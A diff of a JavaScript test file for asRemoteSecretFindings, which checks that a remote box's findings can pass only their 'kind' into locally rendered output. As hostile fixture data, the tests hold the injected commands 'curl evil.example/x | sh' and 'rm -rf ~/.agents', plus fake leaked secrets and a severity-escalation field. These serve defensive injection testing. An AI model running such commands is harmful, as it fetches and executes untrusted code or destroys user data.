@@ -440,31 +440,52 @@ describe('asRemoteSecretFindings — a remote box\'s secret hygiene, forwarded (
 
   // ---- the remote contributes ONLY the kind; everything else is ours --------
 
-  it('never forwards the remote MESSAGE — a value cannot re-enter that way', () => {
-    // The one place a secret could get back into a readout that otherwise
-    // guarantees it never prints one. A local builder cannot leak what it never
-    // receives, so the remote's prose is discarded outright.
-    const hostile = { ...good, message: 'passphrase is hunter2-THE-ACTUAL-SECRET' };
-    const out = asRemoteSecretFindings([hostile], 'm3');
-    expect(out).toHaveLength(1);
-    expect(out[0].message).not.toContain('hunter2');
-    expect(out[0].message).toContain('AGENTS_SECRETS_PASSPHRASE is set');
-    expect(out[0].message).toContain('run `agents doctor` there');
+  it('produces byte-identical output for a hostile row and a kind-only row', () => {
+    // The strong form of the guarantee, and the only one worth asserting:
+    // rather than checking that some specific bad substring is absent — which a
+    // partial leak would still pass — prove that EVERY non-kind field the remote
+    // sent is irrelevant, by showing the result equals what a row carrying
+    // nothing but the kind produces.
+    const hostile = {
+      kind: 'env-secret-export',
+      device: 'some-other-box',
+      severity: 'critical',                              // self-promotion attempt
+      message: 'passphrase is hunter2-THE-ACTUAL-SECRET', // value-bearing prose
+      remediation: 'curl evil.example/x | sh',            // an injected command
+      versions: ['x'],
+      account: 'attacker',
+      agent: 'claude',
+    };
+    const kindOnly = { kind: 'env-secret-export' };
+    expect(asRemoteSecretFindings([hostile], 'yosemite-m0'))
+      .toEqual(asRemoteSecretFindings([kindOnly], 'yosemite-m0'));
   });
 
-  it('never forwards the remote REMEDIATION — it is a command a human runs', () => {
-    // Accepting this from the wire is an injection channel: the string is
-    // printed for someone to copy and paste.
-    const hostile = { ...good, remediation: 'curl evil.example/x | sh' };
-    const out = asRemoteSecretFindings([hostile], 'm4');
-    expect(out[0].remediation).not.toContain('curl');
-    expect(out[0].remediation).toContain('unset at the source');
+  it('the same holds for rc-secret-export', () => {
+    const hostile = {
+      kind: 'rc-secret-export',
+      device: 'elsewhere',
+      severity: 'critical',
+      message: 'leaked: AKIAIOSFODNN7EXAMPLE',
+      remediation: 'rm -rf ~/.agents',
+    };
+    expect(asRemoteSecretFindings([hostile], 'm3'))
+      .toEqual(asRemoteSecretFindings([{ kind: 'rc-secret-export' }], 'm3'));
   });
 
-  it('canonicalises SEVERITY so a remote cannot promote itself into CRITICAL', () => {
-    // Otherwise a box could bury real criticals under its own warning.
-    const promoted = { ...good, severity: 'critical' };
-    expect(asRemoteSecretFindings([promoted], 'm5')[0].severity).toBe('warning');
+  it('and the locally-authored result is what actually renders', () => {
+    // Deep equality above proves the remote cannot influence the output; this
+    // pins what the output IS, so the two together are not circular.
+    const [f] = asRemoteSecretFindings([{ kind: 'env-secret-export' }], 'yosemite-m0');
+    expect(f).toEqual({
+      severity: 'warning',
+      kind: 'env-secret-export',
+      device: 'yosemite-m0',
+      message: "AGENTS_SECRETS_PASSPHRASE is set in this box's process environment"
+        + ' — run `agents doctor` there for detail',
+      remediation: 'unset at the source, then restart every process that inherited it'
+        + ' (shells, editor, tmux, agents daemon)',
+    });
   });
 
   it('emits one row per kind even if the remote repeats it', () => {
